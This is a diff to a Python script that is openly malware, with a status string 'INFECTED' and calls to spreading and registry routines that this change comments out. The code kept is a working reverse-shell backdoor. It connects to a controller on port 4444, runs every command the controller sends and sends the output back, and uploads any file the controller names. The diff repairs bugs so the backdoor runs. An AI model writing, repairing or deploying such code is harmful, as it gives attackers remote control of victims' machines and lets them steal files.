@@ -1,21 +1,23 @@
+#!/usr/bin/python3.8
 import subprocess
+import sys
 import socket
 from time import *
-from viral import *
-from registry import *
+#from viral import *
+#from registry import *
 
 
 status = 'INFECTED'
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-SERVER_HOST = ''
+SERVER_HOST = '127.0.0.1'
 SERVER_PORT = 4444
 BUFFER_SIZE = 1024
 
 
 def upload():
-    file = sock.recv(BUFFER_SIZE)
+    file = sock.recv(BUFFER_SIZE).decode()
     f = open(file, 'rb')
     i = f.read(BUFFER_SIZE)
     while i:
@@ -40,17 +42,16 @@ def connect():
                 received = sock.recv(BUFFER_SIZE).decode()
                 if received == 'quit':
                     sock.close()
+                    sys.exit()
                 elif received == 'download':
                     upload()
                 else:
-                    result = subprocess.Popen(received, shell=False, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-                    output = result.stdout.read() + result.stderr.read()
-                    sock.send(output)
-        continue
+                    result = subprocess.getoutput(received)
+                    sock.send(result.encode())
 
 
 if __name__ == '__main__':
-    spread()
-    virus_property()
-    regc()
+    # spread()
+    # virus_property()
+    # regc()
     connect()
